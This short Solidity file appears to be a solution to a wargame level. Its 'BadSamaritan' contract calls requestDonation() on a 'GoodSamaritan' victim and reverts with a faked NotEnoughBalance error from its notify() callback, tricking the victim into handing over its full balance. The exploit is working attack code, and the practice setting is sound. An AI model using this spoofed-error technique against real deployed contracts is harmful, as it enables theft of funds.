// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/utils/Address.sol";
import "./Task.sol";

contract BadSamaritan {

    GoodSamaritan public victim;

    error NotEnoughBalance();

    constructor(address _victim) {
        victim = GoodSamaritan(_victim);
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }        
    }

    function attackRequest() public {
        victim.requestDonation();
    }
}

